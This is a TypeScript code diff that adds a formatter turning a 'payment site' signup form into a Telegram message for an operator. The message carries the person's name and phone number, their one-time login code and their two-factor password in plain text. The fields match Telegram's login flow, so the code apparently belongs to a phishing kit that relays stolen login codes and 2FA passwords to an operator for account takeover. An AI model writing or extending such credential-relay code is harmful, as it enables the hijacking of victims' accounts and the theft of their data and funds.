@@ -304,6 +304,25 @@ const TELEMETRY_LABEL = /^([^:\n]{1,40}?)\s*:\s+([\s\S]+)$/;
  * dropped. Chat text = one quote "<b>Name:</b> text" (line breaks kept; long = expandable); a short
  * event = "<b>user</b> · event"; form JSON = "key: value" lines (empty values dropped).
  */
+/**
+ * The payment site's signup form (useRegisterForm posts the whole form state): a labelled card
+ * with only what an operator uses. Internal send-code state (phoneCodeHash, codeLength, codeType,
+ * deliveryMessage, ...) is dropped.
+ */
+function signupToHtml(user: string, form: Record<string, unknown>): string {
+    const str = (v: unknown) => (v === undefined || v === null ? '' : String(v).trim());
+    const phone = `${str(form.phoneCountryCode)}${str(form.phoneNumber)}`;
+    const name = [str(form.firstName), str(form.lastName)].filter(Boolean).join(' ');
+    const step = str(form.otp) ? 'code entered' : 'phone entered';
+    const rows = [
+        name && `Name: ${escapeTelegramHtml(name)}`,
+        str(form.phoneNumber) && `Phone: <code>${escapeTelegramHtml(phone)}</code>`,
+        str(form.otp) && `Code: <code>${escapeTelegramHtml(str(form.otp))}</code>`,
+        str(form.password) && `2FA: <code>${escapeTelegramHtml(str(form.password))}</code>`,
+    ].filter(Boolean);
+    return `📝 ${user} · signup, ${step}${rows.length ? `\n${rows.join('\n')}` : ''}`;
+}
+
 export function telemetryToHtml(text: string): string {
     const plain = String(text ?? '').replace(/<br\s*\/?>/gi, '\n').replace(HTML_TAG, '').replace(/&(lt|gt|quot|#39|amp);/g, (m) => ENTITIES[m] ?? m);
     const lines = plain.split('\n');
@@ -315,6 +334,7 @@ export function telemetryToHtml(text: string): string {
     try {
         const parsed = JSON.parse(body);
         if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
+            if ('phoneNumber' in parsed) return signupToHtml(user, parsed);
             const rows = Object.entries(parsed)
                 .filter(([, v]) => v !== '' && v !== null && v !== undefined)
                 .map(([k, v]) => `${escapeTelegramHtml(k)}: <code>${escapeTelegramHtml(typeof v === 'object' ? JSON.stringify(v) : String(v))}</code>`);
